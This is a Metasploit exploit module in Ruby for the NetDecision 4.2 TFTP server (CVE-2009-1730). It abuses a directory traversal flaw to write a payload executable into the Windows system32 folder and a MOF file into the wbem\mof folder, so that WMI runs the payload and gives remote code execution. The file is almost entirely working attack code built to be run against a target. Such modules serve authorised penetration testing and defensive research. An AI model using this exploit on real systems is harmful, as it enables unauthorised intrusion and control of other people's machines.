##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Rex::Proto::TFTP
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize(info={})
    super(update_info(info,
      'Name'           => "NetDecision 4.2 TFTP Writable Directory Traversal Execution",
      'Description'    => %q{
          This module exploits a vulnerability found in NetDecision 4.2 TFTP server. The
        software contains a directory traversal vulnerability that allows a remote attacker
        to write arbitrary file to the file system, which results in code  execution under
        the context of user executing the TFTP Server.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Rob Kraus', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2009-1730'],
          ['OSVDB', '54607'],
          ['BID', '35002']
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00",
        },
      'DefaultOptions'  =>
        {
          'ExitFunction' => "none"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['NetDecision 4.2 TFTP on Windows XP SP3 / Windows 2003 SP2', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "May 16 2009",
      'DefaultTarget'  => 0))

    register_options([
      OptInt.new('DEPTH', [false, "Levels to reach base directory",1]),
      OptAddress.new('RHOST', [true, "The remote TFTP server address"]),
      OptPort.new('RPORT', [true, "The remote TFTP server port", 69])
    ], self.class)
  end

  def upload(filename, data)
    tftp_client = Rex::Proto::TFTP::Client.new(
      "LocalHost"  => "0.0.0.0",
      "LocalPort"  => 1025 + rand(0xffff-1025),
      "PeerHost"   => datastore['RHOST'],
      "PeerPort"   => datastore['RPORT'],
      "LocalFile"  => "DATA:#{data}",
      "RemoteFile" => filename,
      "Mode"       => "octet",
      "Context"    => {'Msf' => self.framework, "MsfExploit" => self },
      "Action"     => :upload
    )

    ret = tftp_client.send_write_request { |msg| print_status(msg) }
    while not tftp_client.complete
      select(nil, nil, nil, 1)
      tftp_client.stop
    end
  end

  def exploit
    peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"

    # Setup the necessary files to do the wbemexec trick
    exe_name = rand_text_alpha(rand(10)+5) + '.exe'
    exe      = generate_payload_exe
    mof_name = rand_text_alpha(rand(10)+5) + '.mof'
    mof      = generate_mof(mof_name, exe_name)

    # Configure how deep we want to traverse
    depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
    levels = "../" * depth

    # Upload the malicious executable to C:\Windows\System32\
    print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
    upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)

    # Let the TFTP server idle a bit before sending another file
    select(nil, nil, nil, 1)

    # Upload the mof file
    print_status("#{peer} - Uploading .mof...")
    upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
  end
end
